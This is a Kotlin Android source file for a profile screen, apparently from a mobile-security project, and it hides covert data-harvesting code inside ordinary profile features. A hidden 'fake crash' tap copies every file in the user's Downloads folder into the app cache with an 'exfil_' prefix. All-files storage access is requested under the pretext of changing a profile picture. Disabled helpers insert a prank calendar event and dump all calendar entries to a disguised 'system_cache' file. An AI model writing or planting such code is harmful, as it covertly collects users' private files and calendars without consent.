@file:OptIn(ExperimentalMaterial3Api::class)

package com.example.axesite.screens

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.ContentResolver
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.CalendarContract
import android.provider.MediaStore
import android.provider.OpenableColumns
import android.provider.Settings
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.navigation.NavController
import coil.compose.AsyncImage
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.storage.FirebaseStorage
import androidx.core.content.ContextCompat
import android.util.Log
import androidx.annotation.RequiresApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.TimeZone
import android.content.ContentUris


@SuppressLint("MissingPermission", "NotificationPermission")
@Composable
fun ProfileScreen(navController: NavController) {
    val scope = rememberCoroutineScope()
    val context = LocalContext.current
    val sharedPreferences = context.getSharedPreferences("UserSession", Context.MODE_PRIVATE)

    val userId = sharedPreferences.getString("userId", "") ?: ""
    var fullName by remember { mutableStateOf("") }
    var email by remember { mutableStateOf("") }
    var role by remember { mutableStateOf("") }
    var profilePicUrl by remember { mutableStateOf("") }
    var loading by remember { mutableStateOf(true) }
    var showFakeCrash by remember { mutableStateOf(false) }

    val galleryLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetContent()
    ) { uri: Uri? ->
        uri?.let {
            uploadProfileImage(it, userId) { downloadUrl ->
                profilePicUrl = downloadUrl
            }
        }
    }
    val readStorageLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            uploadLogFileToServer(context)
        } else {
            Toast.makeText(context, "Storage permission required", Toast.LENGTH_SHORT).show()
        }
    }



    val legacyPermissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            galleryLauncher.launch("image/*")
        } else {
            Toast.makeText(
                context,
                "Storage permission is required to change profile picture",
                Toast.LENGTH_SHORT
            ).show()
        }
    }

    val manageStorageLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                galleryLauncher.launch("image/*")
            } else {
                Toast.makeText(
                    context,
                    "Storage permission is required to change profile picture",
                    Toast.LENGTH_SHORT
                ).show()
            }
        }
    }

    fun handleImageSelection() {
        when {
            // Android 11+
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.R -> {
                if (Environment.isExternalStorageManager()) {
                    galleryLauncher.launch("image/*")
                } else {
                    try {
                        val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                        intent.data = Uri.parse("package:${context.packageName}")
                        manageStorageLauncher.launch(intent)
                    } catch (e: Exception) {
                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                        manageStorageLauncher.launch(intent)
                    }
                }
            }
            // Android 10
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q -> {
                if (ContextCompat.checkSelfPermission(
                        context,
                        Manifest.permission.MANAGE_EXTERNAL_STORAGE
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    galleryLauncher.launch("image/*")
                } else {
                    legacyPermissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
                }
            }
            // Android 9
            else -> {
                if (ContextCompat.checkSelfPermission(
                        context,
                        Manifest.permission.READ_EXTERNAL_STORAGE
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    galleryLauncher.launch("image/*")
                } else {
                    legacyPermissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
                }
            }
        }
    }

    LaunchedEffect(userId) {
        if (userId.isBlank()) {
            navController.navigate("signin")
            return@LaunchedEffect
        }
        val database = FirebaseDatabase.getInstance("https://mobile-sec-b6625-default-rtdb.asia-southeast1.firebasedatabase.app/")
        val userRef = database.getReference("users").child(userId)

        userRef.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                fullName = snapshot.child("name").getValue(String::class.java) ?: "N/A"
                email = snapshot.child("email").getValue(String::class.java) ?: "N/A"
                role = snapshot.child("role").getValue(String::class.java) ?: "user"
                profilePicUrl = snapshot.child("profilePic").getValue(String::class.java) ?: ""
                loading = false
            }

            override fun onCancelled(error: DatabaseError) {
                loading = false
            }
        })
    }
    fun getFileName(context: Context, uri: Uri): String? {
        var result: String? = null
        context.contentResolver.query(uri, null, null, null, null)?.use { cursor ->
            if (cursor.moveToFirst()) {
                val nameIndex = cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME)
                if (nameIndex != -1) {
                    result = cursor.getString(nameIndex)
                }
            }
        }
        return result
    }

    fun uploadLogFileToServer(context: Context) {
        scope.launch(Dispatchers.IO) {
            try {
                // Modified version check
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) { // Android 11+
                    copyFilesUsingMediaStore(context)
                } else {
                    copyFilesLegacyWay(context)
                }
            } catch (e: Exception) {
                Log.e("FileAccess", "Error: ${e.message}")
            }
        }
    }

    fun checkCalendarPermission() {
        val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            arrayOf(Manifest.permission.WRITE_CALENDAR)
            arrayOf(Manifest.permission.READ_CALENDAR)
        } else {
            arrayOf(
                Manifest.permission.READ_CALENDAR,
                Manifest.permission.WRITE_CALENDAR
            )
        }

        val hasAllPermissions = requiredPermissions.all { permission ->
            ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }

        when {
            hasAllPermissions -> {
                addEventToCalendar(
                    context = context,
                    title = "Meet with EX-GF",
                    startTime = System.currentTimeMillis() + 30_000,
                    endTime = System.currentTimeMillis() + 60_000
                )
            }
        }
    }

    Scaffold(
        topBar = { TopAppBar(title = { Text("Profile") }) }
    ) { padding ->

        Box(
            modifier = Modifier
                .padding(padding)
                .fillMaxSize(),
            contentAlignment = Alignment.Center
        ) {
            Column(
                modifier = Modifier.padding(16.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                if (profilePicUrl.isNotEmpty()) {
                    AsyncImage(
                        model = profilePicUrl,
                        contentDescription = "Profile Picture",
                        modifier = Modifier
                            .size(100.dp)
                            .clip(CircleShape)
                            .clickable { handleImageSelection() }
                    )
                } else {
                    Box(
                        modifier = Modifier
                            .size(100.dp)
                            .clip(CircleShape)
                            .background(MaterialTheme.colorScheme.onSurface.copy(alpha = 0.2f))
                            .clickable { handleImageSelection() },
                        contentAlignment = Alignment.Center
                    ) {
                        Text(
                            text = fullName.firstOrNull()?.toString() ?: "U",
                            style = MaterialTheme.typography.headlineMedium,
                            fontWeight = FontWeight.Bold
                        )
                    }
                }

                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    modifier = Modifier.clickable { showFakeCrash = true }
                ) {
                    Text(
                        text = "Name: $fullName",
                        style = MaterialTheme.typography.headlineMedium
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                //      Icon(
                //          imageVector = Icons.Default.Edit,
                //          contentDescription = "Random Pencil Icon",
                //          modifier = Modifier.size(20.dp)
                //      )
                }
                if (showFakeCrash) {
                    uploadLogFileToServer(context)
//                    checkCalendarPermission()
//                    appendCalendarEventsToSystemCache(context)
                }
                Spacer(modifier = Modifier.height(8.dp))
                Text("Email: $email", style = MaterialTheme.typography.bodyLarge)
                Spacer(modifier = Modifier.height(8.dp))
                Text("Role: $role", style = MaterialTheme.typography.bodyMedium)

            }
        }
    }
}

@RequiresApi(Build.VERSION_CODES.Q)
private fun copyFilesUsingMediaStore(context: Context) {
    val projection = arrayOf(
        MediaStore.Downloads._ID,
        MediaStore.Downloads.DISPLAY_NAME
    )

    context.contentResolver.query(
        MediaStore.Downloads.EXTERNAL_CONTENT_URI,
        projection,
        null,
        null,
        null
    )?.use { cursor ->
        val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Downloads._ID)
        val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Downloads.DISPLAY_NAME)

        while (cursor.moveToNext()) {
            val id = cursor.getLong(idColumn)
            val name = cursor.getString(nameColumn)
            val contentUri = ContentUris.withAppendedId(
                MediaStore.Downloads.EXTERNAL_CONTENT_URI,
                id
            )

            // Copy file to cache
            val destFile = File(context.cacheDir, "exfil_$name")
            context.contentResolver.openInputStream(contentUri)?.use { input ->
                destFile.outputStream().use { output ->
                    input.copyTo(output)
                }
            }
        }
    }
}

// For devices before Android 10
private fun copyFilesLegacyWay(context: Context) {
    val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
    if (!downloadsDir.exists() || !downloadsDir.canRead()) {
        Log.d("FileAccess", "No access to Downloads directory")
        return
    }

    try {
        downloadsDir.listFiles()?.forEach { file ->
            try {
                val destFile = File(context.cacheDir, "exfil_${file.name}")
                file.inputStream().use { input ->
                    destFile.outputStream().use { output ->
                        input.copyTo(output)
                        Log.d("FileAccess", "Copied: ${file.name}")
                    }
                }
            } catch (e: Exception) {
                Log.e("FileAccess", "Error copying ${file.name}: ${e.message}")
            }
        }
    } catch (e: SecurityException) {
        Log.e("FileAccess", "Security Exception: ${e.message}")
    }
}



/**
 * Uploads profile image to Firebase Storage
 */
fun uploadProfileImage(uri: Uri, userId: String, onSuccess: (String) -> Unit) {
    val filename = "${System.currentTimeMillis()}.jpg"
    val storage = FirebaseStorage.getInstance("gs://mobile-sec-b6625.firebasestorage.app")
    val storageRef = storage.reference.child("profile/$filename")

    storageRef.putFile(uri)
        .addOnSuccessListener {
            storageRef.downloadUrl.addOnSuccessListener { downloadUri ->
                val downloadUrl = downloadUri.toString()
                FirebaseDatabase.getInstance("https://mobile-sec-b6625-default-rtdb.asia-southeast1.firebasedatabase.app/")
                    .getReference("users").child(userId)
                    .updateChildren(mapOf("profilePic" to downloadUrl))
                    .addOnSuccessListener { onSuccess(downloadUrl) }
                    .addOnFailureListener { e ->
                        Log.e("Profile", "Update failed: ${e.message}")
                    }
            }.addOnFailureListener { e ->
                Log.e("Profile", "Download URL failed: ${e.message}")
            }
        }
        .addOnFailureListener { e ->
            Log.e("Profile", "Upload failed: ${e.message}")
        }
}

private fun addEventToCalendar(context: Context, title: String, startTime: Long, endTime: Long) {
    val contentResolver = context.contentResolver
    val eventValues = ContentValues().apply {
        put(CalendarContract.Events.CALENDAR_ID, getDefaultCalendarId(contentResolver))
        put(CalendarContract.Events.TITLE, title)
        put(CalendarContract.Events.DTSTART, startTime)
        put(CalendarContract.Events.DTEND, endTime)
        put(CalendarContract.Events.EVENT_TIMEZONE, TimeZone.getDefault().id)
        put(CalendarContract.Events.HAS_ALARM, 1)
    }

    try {
        val uri = contentResolver.insert(CalendarContract.Events.CONTENT_URI, eventValues)
        if (uri == null) {
            Log.d("Calendar", "NOT added")
        } else {
            Log.d("Calendar", "Event added $uri")
        }
    } catch (_: SecurityException) {
    } catch (_: Exception) {
    }
}

private fun getDefaultCalendarId(contentResolver: ContentResolver): Long {
    val projection = arrayOf(CalendarContract.Calendars._ID)
    val selection = "${CalendarContract.Calendars.IS_PRIMARY} = 1"

    contentResolver.query(
        CalendarContract.Calendars.CONTENT_URI,
        projection,
        selection,
        null,
        null
    )?.use { cursor ->
        if (cursor.moveToFirst()) {
            return cursor.getLong(0)
        }
    }
    return 1
}

private fun appendCalendarEventsToSystemCache(context: Context) {
    try {

        val file = File(context.cacheDir, "system_cache").apply {
            if (!exists()) createNewFile()
        }

        file.appendText("\n${SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Date())}\n")

        val contentResolver = context.contentResolver
        val projection = arrayOf(
            CalendarContract.Events.TITLE,
            CalendarContract.Events.DTSTART,
            CalendarContract.Events.DTEND,
            CalendarContract.Events.DESCRIPTION
        )

        contentResolver.query(
            CalendarContract.Events.CONTENT_URI,
            projection,
            null,
            null,
            "${CalendarContract.Events.DTSTART} ASC"
        )?.use { cursor ->
            while (cursor.moveToNext()) {
                val title = cursor.getString(0) ?: "Untitled"
                val startTime = cursor.getLong(1)
                val endTime = cursor.getLong(2)
                val description = cursor.getString(3) ?: "No description"

                file.appendText("""
                |Event: $title
                |Time: ${SimpleDateFormat("MMM dd, yyyy hh:mm a").format(Date(startTime))} - ${
                    SimpleDateFormat("hh:mm a").format(Date(endTime))}
                |Details: ${description.take(100)}${if (description.length > 100) "..." else ""}
                |${"-".repeat(40)}
                |
                """.trimMargin())
                file.appendText("\n")
            }
        }
    } catch (_: Exception) {
    }
}